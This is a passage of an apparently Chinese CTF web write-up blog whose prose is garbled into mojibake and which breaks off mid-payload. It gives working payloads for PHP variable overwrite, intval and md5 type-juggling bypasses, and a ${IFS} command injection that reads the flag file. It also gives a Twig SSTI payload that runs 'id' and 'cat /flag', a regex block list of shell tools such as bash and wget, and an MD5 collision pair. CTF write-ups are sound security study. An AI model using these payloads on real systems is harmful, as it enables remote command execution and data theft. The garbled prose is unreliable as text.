class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>exitå’Œdieä¸€æ ·ï¼Œéƒ½æ˜¯è¾“å‡ºä¸€æ¡ä¿¡æ¯åé€€å‡ºå½“å‰è„šæœ¬<br>ä¸Šé¢çš„ä»£ç ä¸­æœ€é‡è¦çš„ä¸¤å—ä»£ç </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = $<span class="hljs-variable">$y</span>;<br>&#125;<br><br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>åˆ©ç”¨ä¸€ä¸‹,å…ˆè§£é‡Šä¸€ä¸‹å¯å˜å˜é‡ï¼š<br>å¦‚æœä¸€ä¸ªå˜é‡ä¿å­˜çš„å€¼åˆšå¥½æ˜¯å¦å¤–ä¸€ä¸ªå˜é‡çš„åå­—ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥é€šè¿‡è®¿é—®ä¸€ä¸ªå˜é‡å¾—åˆ°å¦å¤–ä¸€ä¸ªå˜é‡çš„å€¼ï¼šåœ¨å˜é‡ä¹‹å‰å†å¤šåŠ ä¸€ä¸ª$ç¬¦å·<br>ä¾‹ï¼š</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$a</span>=&#x27;b&#x27;;</span><br><span class="hljs-meta"><span class="hljs-keyword">$b</span>=&#x27;bbbb&#x27;;</span><br>echo <span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>a;<br><span class="hljs-comment">//è¾“å‡ºbbbb </span><br><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>a-&gt;<span class="hljs-symbol">$</span>b<br></code></pre></td></tr></table></figure>
<p>ç®€å•ç†è§£ä¸º$$aç›¸å½“äº$($a)<br>å†å¯¹ä¸Šé¢çš„ä»£ç è¿›è¡Œè§£è¯»</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$</span><span class="hljs-variable">$x</span> = <span class="hljs-variable">$</span><span class="hljs-variable">$y</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>æ¯”å¦‚GETè¾“å…¥a&#x3D;flag<br>é‚£ä¹ˆ$x&#x3D;a,$y&#x3D;flag<br> $$x &#x3D; $$yæ‰€ä»¥$a&#x3D;$flag,é…åˆexitè¿™æ ·å°±å¯ä»¥è¾“å…¥$flagçš„å€¼äº†<br> æ„é€ payload<br> <figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">?handsome=<span class="hljs-built_in">flag</span>&amp;x=<span class="hljs-built_in">flag</span>&amp;<span class="hljs-built_in">flag</span>=x<br></code></pre></td></tr></table></figure><br>handsome&#x3D;flagä¸ç”¨è¯´ å°±æ˜¯è®©$handsome&#x3D;$flag<br>åé¢çš„ç›®çš„å°±æ˜¯è®©æˆ‘ä»¬ä¼ å…¥çš„å˜é‡æ˜¯ flag å€¼ä¸æ˜¯flag è¿›è€Œèƒ½å¤Ÿexit handsome<br>è¿™é‡Œçš„å€¼è¡¨é¢æ˜¯ x ä½†å‰é¢æˆ‘ä»¬è¿›è¡Œäº†å˜é‡è¦†ç›–ä½¿å¾— x&#x3D;flag æ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬è¾“å‡ºxçš„å€¼å°±æ˜¯flagçš„å€¼<br><img src="/images/JNSYNMWR0M0GM7R.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h2><p>çœ‹åˆ°è¿™ç§æ²¡æœ‰å¾ˆå¤šæè¿°çš„é¢˜ç›´æ¥æå‡ºdirsearch<br>æ‰«å‡ºrobots.txt<br>é‡Œé¢æç¤ºäº†fAke_f1agggg.php<br>è¿›å…¥æŸ¥çœ‹ï¼Œä¸å‡ºæ„æ–™<br>å“ªå“ªéƒ½çœ‹ä¸€çœ‹<br>æ‰¾åˆ°ä¸€ä¸ª<br><img src="/images/UK82BH2SOKD0KWXEE9F6U.png" srcset="/img/loading.gif" lazyload><br>å¾ˆéš¾ç»·<br><img src="/images/0F4A1WUAHEN3Y59N.png" srcset="/img/loading.gif" lazyload><br>æ¢ç´¢åˆ°ä¸€ä¸ªæ–°åŠŸèƒ½ğŸ™‚<br><img src="/images/TLFZIYE71LUDA05O.png" srcset="/img/loading.gif" lazyload><br>è½¬åŒ–ä¹‹å</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><br><br><span class="hljs-comment">//level 1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å»éæ´²å§&quot;</span>);<br>&#125;<br><span class="hljs-comment">//level 2</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>))<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;</span>;<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å»éæ´²å§&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//get flag</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$get_flag</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$get_flag</span>,<span class="hljs-string">&quot; &quot;</span>))&#123;<br>        <span class="hljs-variable">$get_flag</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;wctf2020&quot;</span>, <span class="hljs-variable">$get_flag</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$get_flag</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¿«åˆ°éæ´²äº†&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å»éæ´²å§&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
<p>å¥½å—å¤šäº†ï¼Œç°åœ¨ä¹Ÿå®¹æ˜“äº†<br>ç›´æ¥payload</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts">?<span class="hljs-attr">num</span><span class="hljs-operator">=</span><span class="hljs-number">3e4</span><span class="hljs-variable">&amp;md5</span>=<span class="hljs-number">0e215962017</span><span class="hljs-variable">&amp;get_flag</span>=ls<br><span class="hljs-comment">//404.html fAke_f1agggg.php fl4g.php fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag img.jpg index.php robots.txt </span><br>?<span class="hljs-attr">num</span><span class="hljs-operator">=</span><span class="hljs-number">3e4</span><span class="hljs-variable">&amp;md5</span>=<span class="hljs-number">0e215962017</span><span class="hljs-variable">&amp;get_flag</span>=tac$<span class="hljs-punctuation">&#123;</span>IFS<span class="hljs-punctuation">&#125;</span>fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag<br><span class="hljs-comment">//flag&#123;0a4bf020-4cfd-4519-ac84-0481a8b786a2&#125; </span><br></code></pre></td></tr></table></figure>

<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>è¾“å…¥adminè¯•è¯•<br>å›æ˜¾admin<br>æ‰¾åˆ°æºä»£ç <br><img src="/images/0UOK26JNCRDJ39EQSF.png" srcset="/img/loading.gif" lazyload><br>çœ‹çœ‹èƒ½ä¸èƒ½xä¸€ä¸‹<br><img src="/images/XXRMNSDFETL2IUQW.png" srcset="/img/loading.gif" lazyload><br>è¢«htmlè½¬ä¸ºå®ä½“å­—ç¬¦äº†ï¼Œä¸èƒ½x<br>hintä¸­æœ‰æé†’Why not take a closer look at cookiesï¼Ÿ<br>æŠ“åŒ…çœ‹çœ‹<br>æœ‰ä¸¤ä¸ªåŒ…ï¼Œç¬¬äºŒä¸ªåŒ…cookieä¸­userå¯ä»¥æ”¹å˜é¡µé¢å›æ˜¾<br>é‚£å°±æŠ“åˆ°ç¬¬äºŒä¸ªåŒ…<br>æœ¬é¢˜çš„çŸ¥è¯†ç‚¹æ˜¯åˆ©ç”¨æœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥æ”»å‡»ï¼ŒSSTIé‡Œé¢çš„Twigæ”»å‡»<br>åˆ¤æ–­æ¨¡æ¿æ³¨å…¥ç±»å‹çš„æ–¹æ³•<br><img src="/images/61b42a16c2b405e6ab1ada36470713f1.png" srcset="/img/loading.gif" lazyload><br>è¾“å…¥49,è¿”å›49è¡¨ç¤ºæ˜¯Twigæ¨¡å—<br>è¾“å…¥49,è¿”å›7777777è¡¨ç¤ºæ˜¯jinja2æ¨¡å—<br>åœ¨cookieå¤„è¿›è¡Œåˆ¤æ–­<br>user&#x3D;49,æŸ¥çœ‹è¿”å›å€¼<br><img src="/images/B08XOX2WGAPXVUVF5.png" srcset="/img/loading.gif" lazyload><br>åˆ¤æ–­ä¸ºTwigæ³¨å…¥<br>ç”±äºæ˜¯Twigæ³¨å…¥ï¼Œæ‰€ä»¥æœ‰å›½å®šçš„payload</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;id&quot;</span>)&#125;&#125;</span><span class="language-xml">//æŸ¥çœ‹id</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;cat /flag&quot;</span>)&#125;&#125;</span><span class="language-xml">//æŸ¥çœ‹flag</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/AZJKHF8MYLVSXY26LX.png" srcset="/img/loading.gif" lazyload><br><img src="/images/JCTE5HBQ6IX0LVB42K.png" srcset="/img/loading.gif" lazyload><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10056#toc-16">Twigæ¨¡æ¿æ³¨å…¥ä»é›¶åˆ°ä¸€</a></p>
<h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p>urlæœ‰ç‚¹å¥‡æ€ª<br><img src="/images/O7TO6JUWTEDZZKGNI8.png" srcset="/img/loading.gif" lazyload><br>cmdéšä¾¿è¾“å…¥123<br>æœ‰å›æ˜¾ï¼Œæ‰§è¡Œä¸€ä¸‹å‘½ä»¤<br>echo%201ï¼Œforbid ~<br>è¢«ç¦æ­¢äº†<br>å†çœ‹imgï¼Œæœ‰ç‚¹åƒbase64ç¼–ç è¿‡çš„ï¼Œbase64è§£ç ä¸€ä¸‹<br><img src="/images/WHMHWO5NM9TXT02WL.png" srcset="/img/loading.gif" lazyload><br>æ›´åƒbase64ç¼–ç è¿‡çš„äº†<br>å†æ¥ä¸€ä¸‹<br><img src="/images/SCSFCWCUQ0RRMHNUTV.png" srcset="/img/loading.gif" lazyload><br>16è¿›åˆ¶è§£ç è¯•è¯•<br><img src="/images/GSFC2R2VJOYPWHQ8WJR.png" srcset="/img/loading.gif" lazyload><br>è·¯å­éƒ½çŸ¥é“äº†<br>åœ¨imgé‡Œä¸Šä¼ ä¸€ä¸ªindex.phpè¯•è¯•<br>åŒæ ·çš„æ–¹æ³•å†ç¼–ç </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php<br><span class="hljs-regexp">//</span>to HEX<br><span class="hljs-number">696</span>e6465782e706870<br><span class="hljs-regexp">//</span>to Base64<br>Njk2ZTY0NjU3ODJlNzA2ODcw<br><span class="hljs-regexp">//</span>to Base64<br>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3<br></code></pre></td></tr></table></figure>

<p><img src="/images/W79NAB1O0JIUAANS4SU5O.png" srcset="/img/loading.gif" lazyload><br><a target="_blank" rel="noopener" href="https://www.lddgo.net/convert/base64-to-image">base64ç¼–ç è½¬å›¾ç‰‡</a><br>ä¸‹è½½ä¸‹æ¥åç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œphpæºç å°±æ‰¾å‡ºæ¥äº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixiï½ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>é‡ç‚¹æ˜¯ä¸‹é¢çš„ä»£ç </p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|<span class="hljs-subst">\&#x27;</span>|<span class="hljs-subst">\&quot;</span>|\`|;|,|\*|\?|<span class="hljs-subst">\\</span>|<span class="hljs-subst">\\</span><span class="hljs-subst">\\</span>|<span class="hljs-subst">\n</span>|<span class="hljs-subst">\t</span>|<span class="hljs-subst">\r</span>|\xA0|\&#123;|\&#125;|<span class="hljs-subst">\(<span class="hljs-operator">|</span>\)</span>|\&amp;[^\d]|@|\||<span class="hljs-subst">\\</span>$|\[|\]|&#123;|&#125;|<span class="hljs-subst">\(<span class="hljs-operator">|</span>\)</span>|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    echo(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    echo <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((string)<span class="hljs-variable">$_POST</span>[&#x27;a&#x27;] <span class="hljs-operator">!==</span> (string)<span class="hljs-variable">$_POST</span>[&#x27;b&#x27;] <span class="hljs-operator">&amp;&amp;</span> md5(<span class="hljs-variable">$_POST</span>[&#x27;a&#x27;]) <span class="hljs-operator">===</span> md5(<span class="hljs-variable">$_POST</span>[&#x27;b&#x27;])) &#123;<br>        echo `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        echo (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>ä¸‹é¢çš„MD5å¯ä»¥ç”¨MD5å¼ºç¢°æ’æ¥ç»•è¿‡</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span>&amp;b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span 